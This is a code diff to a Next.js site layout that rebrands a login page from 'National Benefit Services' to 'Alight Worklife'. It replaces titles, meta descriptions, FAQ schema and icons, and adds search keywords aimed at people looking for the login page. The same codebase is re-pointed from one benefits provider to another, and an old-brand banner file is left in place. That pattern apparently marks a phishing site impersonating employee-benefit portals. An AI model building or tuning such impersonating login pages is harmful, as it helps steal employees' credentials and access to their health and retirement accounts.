@@ -6,18 +6,23 @@ import "./globals.css";
 
 const geist = Geist({ subsets: ["latin"] });
 
-const SITE_BASE_URL = process.env.NEXT_PUBLIC_BASE_URL || 'https://nbs-auth.com'
-const SITE_DOMAIN = new URL(SITE_BASE_URL).hostname
-const SITE_BRAND = "National Benefit Services";
+const SITE_BASE_URL =
+  process.env.NEXT_PUBLIC_BASE_URL ||
+  "https://worklife.alight.com/ah-angular-afirst-web";
+const SITE_DOMAIN = new URL(SITE_BASE_URL).hostname;
+const SITE_BRAND = "Alight Worklife";
 
 export const metadata: Metadata = {
   metadataBase: new URL(SITE_BASE_URL),
   title: {
-    default: "National Benefit Services - Login",
-    template: "%s | National Benefit Services",
+    default: "Alight Worklife - Login",
+    template: "%s | Alight Worklife",
   },
   keywords: [
-    "National Benefit Services",
+    "Alight Worklife",
+    "Worklife login",
+    "worklife.alight.com",
+    "Alight employee benefits",
     "employee benefits portal",
     "benefits login",
     "FSA account",
@@ -37,37 +42,22 @@ export const metadata: Metadata = {
     "benefits account management",
     "benefits eligibility",
     "benefits customer support",
-    
-    "nbsbenefits",
-    "national benefits services",
-    "national benefits",
-    "nbs login",
-    "National Benefit Services login",
-    "NBS Benefits login",
-    "nbs HSA administrator",
-    "nbs Flexible Spending Account (FSA) administrator",
-    "nbs COBRA administration services",
-    "nbs Health Reimbursement Arrangement (HRA) administrator",
-    "nbs Employee benefits administration",
-    "nbs 401(k) retirement plan administration",
-    "nbs Third-party benefits administrator (TPA)",
-    "nbs Employer benefits administration",
-    "nbs retirement plan administration",
-    "nbs third party administrator",
-    "nbs benefit administration",
-    "nbs COBRA administration",
-    "nbs 401k administration",
-    "nbs FSA administration",
-    "nbs HSA administration",
-    "nbs TPA benefits",
-    "nbs employee benefits administrator",
-    "nbs flexible benefit administration",
+    "Alight mobile login",
+    "Worklife app login",
+    "Worklife secure portal",
+    "Alight Worklife login",
+    "Alight benefits login",
+    "Alight employee portal",
+    "worklife benefits portal",
+    "employee benefit login",
+    "worklife alight employee benefits",
+    "worklife alight portal",
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through National Benefit Services.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Secure login for the Alight Worklife employee benefits portal at worklife.alight.com. Access FSA, HSA, COBRA, and employee benefit services through the Worklife portal.`,
 
-  authors: [{ name: "National Benefit Services" }],
-  creator: "National Benefit Services",
-  publisher: "National Benefit Services",
+  authors: [{ name: "Alight Worklife" }],
+  creator: "Alight Worklife",
+  publisher: "Alight Worklife",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -84,8 +74,8 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "National Benefit Services - Login",
-    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
+    title: "Alight Worklife - Login",
+    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Secure login for the Alight Worklife employee benefits portal at worklife.alight.com. Access FSA, HSA, COBRA, and employee benefit services through the Worklife portal.`,
     siteName: SITE_BRAND,
     url: SITE_BASE_URL,
     images: [
@@ -99,14 +89,12 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: "summary",
-    title: "National Benefit Services - Login",
-    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
+    title: "Alight Worklife - Login",
+    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Secure login for the Alight Worklife employee benefits portal at worklife.alight.com. Access FSA, HSA, COBRA, and employee benefit services through the Worklife portal.`,
     images: [`${SITE_BASE_URL}/Nbs%20banner_new.png`],
   },
   icons: {
-    icon: "/favicon.ico",
-    shortcut: "/favicon.ico",
-    apple: "/apple-touch-icon.png",
+    icon: "/favicon-32x32.png",
   },
   category: "Business",
   alternates: {
@@ -134,7 +122,7 @@ const organizationSchema = {
   url: SITE_BASE_URL,
   logo: `${SITE_BASE_URL}/Nbs%20banner_new.png`,
   description:
-    "National Benefit Services provides secure access to FSA, HSA, COBRA, and dependent care benefits through our employee benefits portal.",
+    "Alight Worklife provides secure access to FSA, HSA, COBRA, and employee benefit services through the Worklife portal at worklife.alight.com.",
   sameAs: [],
   contactPoint: {
     "@type": "ContactPoint",
@@ -149,10 +137,10 @@ const faqSchema = {
   mainEntity: [
     {
       "@type": "Question",
-      name: "How do I login to my National Benefit Services account?",
+      name: "How do I login to my Alight Worklife account?",
       acceptedAnswer: {
         "@type": "Answer",
-        text: "Visit the National Benefit Services participant portal and enter your username and password. Select your user role (Participant, Employer, Broker, or Administrator) and click LOGIN.",
+        text: "Visit the Alight Worklife portal at worklife.alight.com and enter your username and password. Select your user role and click LOGIN to access your benefits.",
       },
     },
     {
@@ -165,10 +153,10 @@ const faqSchema = {
     },
     {
       "@type": "Question",
-      name: "How do I reset my National Benefit Services password?",
+      name: "How do I reset my Alight Worklife password?",
       acceptedAnswer: {
         "@type": "Answer",
-        text: "Click the forgot password link on the login page. Follow the verification steps and set a new password for your account.",
+        text: "Click the forgot password link on the Alight Worklife login page. Follow the verification steps and set a new password for your account.",
       },
     },
     {
@@ -203,9 +191,9 @@ export default function RootLayout({
           href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
           rel="stylesheet"
         />
-        <link rel="icon" href="/favicon.ico" />
-        <link rel="shortcut icon" href="/favicon.ico" />
-        <link rel="apple-touch-icon" href="/favicon.ico" />
+        <link rel="icon" href="/images/logo.svg" />
+        <link rel="shortcut icon" href="/images/logo.svg" />
+        <link rel="apple-touch-icon" href="/images/logo.svg" />
       </head>
       <body className={`${geist.className} font-sans antialiased`}>
         {jsonLd.map((schema, idx) => (
